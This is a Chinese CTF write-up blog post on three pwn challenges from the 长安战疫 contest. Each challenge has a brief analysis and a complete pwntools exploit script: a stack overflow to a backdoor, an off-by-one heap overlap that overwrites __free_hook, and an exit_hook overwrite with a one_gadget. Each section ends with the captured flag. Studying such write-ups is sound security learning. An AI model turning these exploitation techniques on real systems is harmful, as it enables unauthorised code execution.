---
layout: article
pageview: true
key: 2022-01-09-changanzhanyi
title: 长安战疫Pwn题WP
author: Ch4rc0al
categories: 
    - WriteUps
tags: 
    - CTF
    - Pwn
---


<!--more-->

## pwn1

一道裸的32位栈溢出，自带后门函数，还附送了栈地址，需要注意的是`main`函数结束时的汇编指令为`leave;mov esp, [ecx-4];ret`而非正常的`leave;ret`，需要根据`mov ecx, [ebp-4]`调整栈帧。

```python
from pwn import *
context(arch='i386',log_level='debug')
# p=process('./pwn1')
# gdb.attach(p,'b read')
p=remote('113.201.14.253',16088)

leave_ret=0x0804853e
system=0x080483ed

p.recvuntil('Gift:')
gift=int(p.recvn(10),16)
log.info(hex(gift))

pay=p32(0x08048540)*12+p32(gift+4)*4

p.send(pay)
p.interactive()

#flag{474b7f9219effe69530da4ad63c1752a}
```

## pwn2

2.27版本的`off by one`，show功能中还没有限制index下限，可以直接泄露libc地址，构造`overlap`修改fd打`__free_hook`即可。

```python
from pwn import *
context(arch='amd64',log_level='debug')

local=0

p=process('./pwn2')

if local!=1:
    p=remote('113.201.14.253',16066)

elf=ELF('./pwn2')
libc=ELF('./libc-2.27.so')

def choose(idx):
    p.sendlineafter('Choice: ',str(idx))

def add(size,con):
    choose(1)
    p.sendlineafter('size: ',str(size))
    p.sendlineafter('content: ',con)

def edit(idx,con):
    choose(2)
    p.sendlineafter('idx: ',str(idx))
    p.sendafter('content: ',con)

def free(idx):
    choose(3)
    p.sendlineafter('idx: ',str(idx))

def show(idx):
    choose(4)
    p.sendlineafter('idx: ',str(idx))

show(-33)
stdout=u64(p.recvn(6)+b'\0'*2)
log.success(hex(stdout))
# gdb.attach(p)
libc_base=stdout-libc.sym['_IO_2_1_stdout_']
log.success(hex(libc_base))

free_hook=libc_base+libc.sym['__free_hook']
log.success(hex(free_hook))

add(0x68,'a'*0x68)
add(0x68,'b'*0x68)
add(0x68,'c'*0x68)
add(0x68,'d'*0x68)
add(0x20,'/bin/sh\x00'*0x4)

free(0)

add(0x68,'a'*0x68+'\xf0')
# gdb.attach(p)
free(3)

free(1)

free(2)

add(0xe8,b'b'*0x68+p64(0x71)+p64(free_hook))

add(0x68,p64(libc_base+libc.sym['system']))
add(0x68,p64(libc_base+libc.sym['system']))
free(4)

# gdb.attach(p)
p.interactive()
#flag{33cb931de8350b94d949efa8220d5433}
```

## pwn3

关键函数`strncat`会在追加时补上一个`\x00`，这样我们在`creat`时输入长度为a的字符串，`levelup`时输入长度为b的字符串，使`a+b=0x24`，就可以覆盖原本记录`level`的位置为`\x00`，使最终计算后的`level`为b，我们第二次`levelup`时再输入长度为c的字符串,就会覆盖`level`为我们的字符串，计算`level`时就会提取`DWORD`类型的变量出来，是`level`值巨大，就可以秒杀boss赢得游戏，进入后门代码。

后门代码为一个任意地址写，我们修改`exit_hook`为`one_gadget`即可。

```python
from pwn import *
context(arch='amd64')
# context.log_level='debug'
p=process('./Gpwn3')
elf=ELF('./Gpwn3')
libc=ELF('./libc-2.23.so')
p=remote('113.201.14.253',16033)


def creat(con):
    p.sendlineafter('choice:','1')
    p.sendlineafter('level :',con)
    sleep(0.1)

def lvlup(con):
    p.sendlineafter('choice:','2')
    p.sendafter('level :',con)
    sleep(0.1)


creat('a'*0x10)
lvlup('\xff'*0x14)
lvlup('\xff'*0x10)

p.sendlineafter('choice:','3')
p.recvuntil('Here\'s your reward: ')

puts=int(p.recvn(14),16)
log.success(hex(puts))
libc_base=puts-libc.sym['puts']
log.success(hex(libc_base))
exit_hook = libc_base+0x5f0040+3848
log.success(hex(exit_hook))

p.send(p64(exit_hook))
ogg=[283174,283258,840051,840264,983972,983984,987719,1009648]
p.send(p64(ogg[6]+libc_base))
# gdb.attach(p)

p.interactive()

#flag{3901afdc7f79dedfdb062a241eb3a575}
```